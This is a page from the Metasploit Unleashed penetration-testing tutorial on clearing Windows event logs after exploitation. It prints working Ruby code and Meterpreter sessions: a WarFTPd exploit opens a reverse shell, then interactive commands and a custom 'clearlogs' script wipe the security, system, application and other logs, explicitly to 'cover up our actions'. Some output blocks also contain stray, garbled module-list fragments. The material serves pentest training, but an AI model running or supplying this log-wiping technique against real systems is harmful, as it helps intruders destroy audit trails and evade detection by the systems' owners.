<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Event Log Management</title>
</head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Event
Log Management</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">Sometimes it's best to not have your
activities logged. Whatever the
reason, you may find a circumstance where you need to clear away the
windows event logs. Looking at the source for the winenum script,
located in 'scripts/meterpreter', we can see the way this function
works.
<br>
<br>
</p>
<pre style="color: rgb(0, 0, 0);">def clrevtlgs(session)<br>    evtlogs = [<br>        'security',<br>        'system',<br>        'application',<br>        'directory service',<br>        'dns server',<br>        'file replication service'<br>        ]<br>    print_status("Clearing Event Logs, this will leave and event 517")<br>    begin<br>    evtlogs.each do |evl|<br>        print_status("tClearing the #{evl} Event Log")<br>        log = session.sys.eventlog.open(evl)<br>        log.clear<br>    end<br>    print_status("Alll Event Logs have been cleared")<br>    rescue ::Exception =&gt; e<br>        print_status("Error clearing Event Log: #{e.class} #{e}")<br><br>    end<br>end</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Let's look at a scenario where we
need to clear the event log, but
instead of using a premade script to do the work for us, we will use
the power of the ruby interpreter in Meterpreter to clear the logs on
the fly. First, let's see our Windows 'System' event log.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:Eventlog-00.png"
 class="image"><img alt="Eventlog-00.png"
 src="http://www.offensive-security.com/w/images/1/1a/Eventlog-00.png"
 width="625" height="384"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
Now, let's exploit the system and manually clear away the logs. We
will model our command off of the winenum script. Running 'log =
client.sys.eventlog.open('system')' will open up the system log for us.
<br>
<br>
</p>
<pre style="color: rgb(0, 0, 0);">msf exploit(warftpd_165_user) &gt; exploit<br><br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Connecting to FTP server 172.16.104.145:21...<br>[*] Connected to target FTP server.<br>[*] Trying target Windows 2000 SP0-SP4 English...<br>[*] Transmitting intermediate stager for over-sized stage...(191 bytes)<br>[*] Sending stage (2650 bytes)<br>[*] Sleeping before handling stage...<br>[*] Uploading DLL (75787 bytes)...<br>[*] Upload completed.<br>[*] Meterpreter session 2 opened (172.16.104.130:4444 -&gt; 172.16.104.145:1246)<br><br><u>meterpreter</u> &gt; irb<br>[*] Starting IRB shell<br>[*] The 'client' variable holds the meterpreter client<br>&gt;&gt; log = client.sys.eventlog.open('system')<br>=&gt; #&lt;#:0xb6779424 @client=#&gt;, #&gt;, #<br><br>"windows/browser/facebook_extractiptc"=&gt;#, "windows/antivirus/trendmicro_serverprotect_earthagent"=&gt;#, "windows/browser/ie_iscomponentinstalled"=&gt;#, "windows/exec/reverse_ord_tcp"=&gt;#, "windows/http/apache_chunked"=&gt;#, "windows/imap/novell_netmail_append"=&gt;#</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Now we'll see if we can clear out
the log by running 'log.clear'.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre style="color: rgb(0, 0, 0);">&gt;&gt; log.clear<br>=&gt; #&lt;#:0xb6779424 @client=#&gt;,<br><br>/trendmicro_serverprotect_earthagent"=&gt;#, "windows/browser/ie_iscomponentinstalled"=&gt;#, "windows/exec/reverse_ord_tcp"=&gt;#, "windows/http/apache_chunked"=&gt;#, "windows/imap/novell_netmail_append"=&gt;#</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Let's see if it worked.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:Eventlog-01.png"
 class="image"><img alt="Eventlog-01.png"
 src="http://www.offensive-security.com/w/images/a/a0/Eventlog-01.png"
 width="625" height="329"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
Success! We could now take this further, and create our own script for
clearing away event logs.
<br>
<br>
</p>
<pre style="color: rgb(0, 0, 0);"># Clears Windows Event Logs<br><br><br>evtlogs = [<br>    'security',<br>        'system',<br>        'application',<br>        'directory service',<br>        'dns server',<br>        'file replication service'<br>    ]<br>puts ("Clearing Event Logs, this will leave an event 517")<br>evtlogs.each do |evl|<br>    puts ("tClearing the #{evl} Event Log")<br>    log = client.sys.eventlog.open(evl)<br>    log.clear<br>end<br>puts ("All Clear! You are a Ninja!")</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">After writing our script, we place
it in
/pentest/exploits/framework3/scripts/meterpreter. Then, let's
re-exploit the system and see if it works.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre style="color: rgb(0, 0, 0);">msf exploit(warftpd_165_user) &gt; exploit<br><br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Connecting to FTP server 172.16.104.145:21...<br>[*] Connected to target FTP server.<br>[*] Trying target Windows 2000 SP0-SP4 English...<br>[*] Transmitting intermediate stager for over-sized stage...(191 bytes)<br>[*] Sending stage (2650 bytes)<br>[*] Sleeping before handling stage...<br>[*] Uploading DLL (75787 bytes)...<br>[*] Upload completed.<br>[*] Meterpreter session 1 opened (172.16.104.130:4444 -&gt; 172.16.104.145:1253)<br><br><u>meterpreter</u> &gt; run clearlogs<br>Clearing Event Logs, this will leave an event 517<br>    Clearing the security Event Log<br>    Clearing the system Event Log<br>    Clearing the application Event Log<br>    Clearing the directory service Event Log<br>    Clearing the dns server Event Log<br>    Clearing the file replication service Event Log<br>All Clear! You are a Ninja!<br><u>meterpreter</u> &gt; exit</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">And the only event left in the log
on the system is the expected 517.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:Eventlog-03.png"
 class="image"><img alt="Eventlog-03.png"
 src="http://www.offensive-security.com/w/images/4/44/Eventlog-03.png"
 width="602" height="63"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
This is the power of Meterpreter. Without much background other
than some sample code we have taken from another script, we have
created a useful tool to help us cover up our actions.
<br>
<br>
</p>
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/MSF_Post_Exploitation"
 title="MSF Post Exploitation">MSF Post Exploitation</a></div>
</body>
</html>
